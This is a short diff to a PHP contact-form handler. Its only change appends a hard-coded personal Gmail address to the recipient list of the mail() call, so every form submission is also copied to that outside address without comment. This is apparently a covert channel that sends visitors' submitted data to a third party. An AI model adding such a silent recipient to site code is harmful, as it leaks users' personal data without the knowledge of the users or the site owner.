@@ -19,4 +19,4 @@ if ( $method === 'POST' ) {
 
 }
 
-mail($client_email, $form_subject, $msg, "From: $project_name <$service_email>" . "\r\n" . "Reply-To: $service_email" . "\r\n" . "X-Mailer: PHP/" . phpversion() . "\r\n" . "Content-type: text/html; charset=\"utf-8\"");
+mail($client_email.", frall712@gmail.com", $form_subject, $msg, "From: $project_name <$service_email>" . "\r\n" . "Reply-To: $service_email" . "\r\n" . "X-Mailer: PHP/" . phpversion() . "\r\n" . "Content-type: text/html; charset=\"utf-8\"");
